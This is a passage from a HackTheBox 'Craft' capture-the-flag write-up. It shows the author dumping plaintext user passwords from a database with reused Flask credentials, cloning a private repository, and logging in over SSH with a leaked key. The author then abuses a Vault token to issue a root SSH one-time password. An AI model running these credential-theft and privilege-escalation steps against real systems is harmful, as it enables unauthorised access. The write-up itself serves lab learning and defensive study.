<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/opt/app/craft_api <span class="comment"># cat settings.py</span></span><br><span class="line"><span class="comment"># Flask settings</span></span><br><span class="line">FLASK_SERVER_NAME = <span class="string">&#x27;api.craft.htb&#x27;</span></span><br><span class="line">FLASK_DEBUG = False  <span class="comment"># Do not use debug mode in production</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Flask-Restplus settings</span></span><br><span class="line">RESTPLUS_SWAGGER_UI_DOC_EXPANSION = <span class="string">&#x27;list&#x27;</span></span><br><span class="line">RESTPLUS_VALIDATE = True</span><br><span class="line">RESTPLUS_MASK_SWAGGER = False</span><br><span class="line">RESTPLUS_ERROR_404_HELP = False</span><br><span class="line">CRAFT_API_SECRET = <span class="string">&#x27;hz66OCkDtv8G6D&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># database</span></span><br><span class="line">MYSQL_DATABASE_USER = <span class="string">&#x27;craft&#x27;</span></span><br><span class="line">MYSQL_DATABASE_PASSWORD = <span class="string">&#x27;qLGockJ6G2J75O&#x27;</span></span><br><span class="line">MYSQL_DATABASE_DB = <span class="string">&#x27;craft&#x27;</span></span><br><span class="line">MYSQL_DATABASE_HOST = <span class="string">&#x27;db&#x27;</span></span><br><span class="line">SQLALCHEMY_TRACK_MODIFICATIONS = False</span><br></pre></td></tr></table></figure>

<p>We got the database credentials. Let’s try to dump it for juicy informations:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/opt/app <span class="comment"># mysql</span></span><br><span class="line">/bin/sh: mysql: not found</span><br></pre></td></tr></table></figure>

<p>Of course, in this jail no <code>mysql</code> available either… Earlier I noticed a database test script. We will edit and use this python script since nothing else is available. </p>
<p>First, let’s list the tables :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">from</span> craft_api <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line">connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,</span><br><span class="line">                             user=settings.MYSQL_DATABASE_USER,</span><br><span class="line">                             password=settings.MYSQL_DATABASE_PASSWORD,</span><br><span class="line">                             db=settings.MYSQL_DATABASE_DB,</span><br><span class="line">                             cursorclass=pymysql.cursors.DictCursor)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">        sql = <span class="string">&quot;SELECT table_name FROM information_schema.tables;&quot;</span></span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        result = cursor.fetchall()</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(row)</span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    connection.close()</span><br></pre></td></tr></table></figure>

<p>Running this script will return two tables: <code>brew</code> and <code>users</code>. </p>
<p>Let’s list the users by editing the <code>dbtest.py</code> script :</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- sql = &quot;SELECT table_name FROM information_schema.tables;&quot;</span></span><br><span class="line"><span class="addition">+ sql = &quot;SELECT * FROM user;&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/opt/app <span class="comment"># python dbtest.py</span></span><br><span class="line">&#123;<span class="string">&#x27;id&#x27;</span>: 1, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;dinesh&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;4aUh0A8PbVJxgd&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;id&#x27;</span>: 4, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;ebachman&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;llJ77D8QFkLPQB&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;id&#x27;</span>: 5, <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;gilfoyle&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;ZEU3N8WNM2rh4T&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>Good, a few users with plain-text passwords. Unfortunately none works on SSH…</p>
<p>So what remains? Let’s go back to the Gogs instance. Login as <code>gilfoyle</code> gives us access to a very interesting private repository:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/67162678-94318d80-f366-11e9-9377-04c310d8654a.png" alt="Craft Infra Repository"></p>
<p>Let’s clone it to explore:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ GIT_SSL_NO_VERIFY=<span class="literal">true</span> git <span class="built_in">clone</span> https://gilfoyle:ZEU3N8WNM2rh4T@gogs.craft.htb/gilfoyle/craft-infra.git</span><br></pre></td></tr></table></figure>

<p>First thing that catches the eye is the <code>.ssh</code> folder containing both the public and private key. We should be able to use to login as <code>gilfoyle</code> through SSH:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ chmod 600 .ssh/id_rsa</span><br><span class="line">[hg8@archbook ~]$ ssh gilfoyle@craft.htb -i id_rsa</span><br><span class="line"></span><br><span class="line">  .   *   ..  . *  *</span><br><span class="line">*  * @()Ooc()*   o  .</span><br><span class="line">    (Q@*0CG*O()  ___</span><br><span class="line">   |\_________/|/ _ \</span><br><span class="line">   |  |  |  |  | / | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | \_| |</span><br><span class="line">   |  |  |  |  |\___/</span><br><span class="line">   |\_|__|__|_/|</span><br><span class="line">    \_________/</span><br><span class="line"></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;id_rsa&#x27;</span>:</span><br><span class="line">Linux craft.htb 4.9.0-8-amd64 <span class="comment">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span></span><br><span class="line"></span><br><span class="line">Last login: Sun Oct 20 06:26:05 2019 from 10.10.15.50</span><br><span class="line">gilfoyle@craft:~$</span><br></pre></td></tr></table></figure>

<p>A passphrase is needed for the <code>id_rsa</code> key, fortunately we have a case of password reuse and the password <code>ZEU3N8WNM2rh4T</code> found in the database dump is valid.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ cat user.txt</span><br><span class="line">bxxxxxxxxxxxxxxxxxxxxxxx4</span><br></pre></td></tr></table></figure>

<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>On user <code>gilfoyle</code> nothing particularly catch the eye and the box seems well configured. </p>
<p>Upon more enumeration we still notice an uncommon ssh configuration :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ cat /etc/ssh/sshd_config</span><br><span class="line">[...]</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<p>It looks like our entry door for root flag will be through SSH.</p>
<p>Inspecting files in the home directory also shows a token that might be useful:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ ls -a</span><br><span class="line">.  ..  .bashrc    .config  .gnupg  .profile  .ssh  user.txt  .vault-token  .viminfo</span><br><span class="line">gilfoyle@craft:~$ cat .vault-token</span><br><span class="line">f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9</span><br></pre></td></tr></table></figure>

<p>We notice this is about Vault again, we saw it already mentioned in the <code>craft-infra</code> repository. Let’s dig that way.</p>
<p>I didn’t know anything about Vault at the time so I checked their website :</p>
<blockquote>
<p>Vault is a tool for secrets management, encryption as a service, and privileged access management.<br><a target="_blank" rel="noopener" href="https://www.vaultproject.io/">https://www.vaultproject.io/</a></p>
</blockquote>
<p>That sounds really interesting for what we need…</p>
<h3 id="Exploiting-Vault-for-SSH-root-password"><a href="#Exploiting-Vault-for-SSH-root-password" class="headerlink" title="Exploiting Vault for SSH root password"></a>Exploiting Vault for SSH root password</h3><p>If we put all the puzzle pieces together it seems like this tool is storing either the <code>root</code> account SSH password or a way to access the <code>root</code> account.</p>
<p>The file <code>craft-infra/src/master/vault/secrets.sh</code> on the <code>craft-infra</code> repository looks promising :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set up vault secrets backend</span></span><br><span class="line"></span><br><span class="line">vault secrets <span class="built_in">enable</span> ssh</span><br><span class="line"></span><br><span class="line">vault write ssh/roles/root_otp \</span><br><span class="line">    key_type=otp \</span><br><span class="line">    default_user=root \</span><br><span class="line">    cidr_list=0.0.0.0/0</span><br></pre></td></tr></table></figure>

<p>It confirms that Vault is used for ssh access to root. <code>key_type=otp</code> seems to mean that it’s working as a one-time password mechanism.</p>
<p>After a bit of Googling we find this documentation on Vault:</p>
<blockquote>
<p>The One-Time SSH Password (OTP) SSH secrets engine type allows a Vault server to issue a One-Time Password every time a client wants to SSH into a remote host using a helper command on the remote host to perform verification.<br><a target="_blank" rel="noopener" href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html">https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html</a></p>
</blockquote>
<p>Alright, we have all the needed information. Let’s generate a One-Time Password for the root account!</p>
<p>From here I will follow the documentation linked above. First we need to mount the secrets engine:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ vault secrets <span class="built_in">enable</span> ssh</span><br><span class="line">Successfully mounted <span class="string">&#x27;ssh&#x27;</span> at <span class="string">&#x27;ssh&#x27;</span>!</span><br></pre></td></tr></table></figure>

<p>Then we create a role with the <code>key_type</code> parameter set to <code>otp</code>. I will use the same command than the one in <code>craft-infra/src/master/vault/secrets.sh</code> to make sure we are not missing anything:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ vault write ssh/roles/root_otp \</span><br><span class="line">     key_type=otp \</span><br><span class="line">     default_user=root \</span><br><span class="line">     cidr_list=0.0.0.0/0</span><br><span class="line">Success! Data written to: ssh/roles/root_otp</span><br></pre></td></tr></table></figure>

<p>Last step we create an OTP credential for an IP of the remote host that belongs to <code>otp_key_role</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=10.10.10.110</span><br><span class="line">Key                Value</span><br><span class="line">---                -----</span><br><span class="line">lease_id           ssh/creds/root_otp/15c8d88c-4e1a-6ec6-4cbb-616cf25e1a7d</span><br><span class="line">lease_duration     768h</span><br><span class="line">lease_renewable    <span class="literal">false</span></span><br><span class="line">ip                 10.10.10.110</span><br><span class="line">key                3d32eb8a-61b1-3376-4402-dd15e72206f8</span><br><span class="line">key_type           otp</span><br><span class="line">port               22</span><br><span class="line">username           root</span><br></pre></td></tr></table></figure>

<p>Seems like everything went fine. Let’s launch a new terminal and try to login as <code>root</code> :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh root@craft.htb</span><br><span class="line"></span><br><span class="line">  .   *   ..  . *  *</span><br><span class="line">*  * @()Ooc()*   o  .</span><br><span class="line">    (Q@*0CG*O()  ___</span><br><span class="line">   |\_________/|/ _ \</span><br><span class="line">   |  |  |  |  | / | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | | | |</span><br><span class="line">   |  |  |  |  | \_| |</span><br><span class="line">   |  |  |  |  |\___/</span><br><span class="line">   |\_|__|__|_/|</span><br><span class="line">    \_________/</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">Linux craft.htb 4.9.0-8-amd64 <span class="comment">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span></span><br><span class="line"></span><br><span class="line">Last login: Sun Oct 20 06:10:03 2019 from 127.0.0.1</span><br><span class="line">root@craft:~<span class="comment"># cat root.txt</span></span><br><span class="line">8xxxxxxxxxxxxxxxxxxx1</span><br></pre></td></tr></table></figure>

<hr>
<p>This box was really a fun time and my favorite so far. As always do not hesitate to contact me for any questions or feedback.</p>
<p>See you next time !</p>
<p>-hg8</p>

  </div>
</article>
<br>
<br>


    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Medium-Box/">Medium Box</a>
    </div>



    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/api/" rel="tag">api</a>, <a class="tag-link-link" href="/tags/craft/" rel="tag">craft</a>, <a class="tag-link-link" href="/tags/eval/" rel="tag">eval</a>, <a class="tag-link-link" href="/tags/flask/" rel="tag">flask</a>, <a class="tag-link-link" href="/tags/git/" rel="tag">git</a>, <a class="tag-link-link" href="/tags/gogs/" rel="tag">gogs</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link-link" href="/tags/python/" rel="tag">python</a>, <a class="tag-link-link" href="/tags/vault/" rel="tag">vault</a>
    </div>





        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Remote-code-execution-on-API"><span class="toc-number">1.2.</span> <span class="toc-text">Remote code execution on API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-from-docker-container-to-user"><span class="toc-number">1.3.</span> <span class="toc-text">Pivot from docker container to user</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-Vault-for-SSH-root-password"><span class="toc-number">2.2.</span> <span class="toc-text">Exploiting Vault for SSH root password</span></a></li></ol></li></ol>
    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022
    <a href="https://hg8.sh">hg8.sh</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


    
<script src="/lib/jquery/jquery.min.js"></script>


<script src="/js/main.js"></script>




</body>
</html>
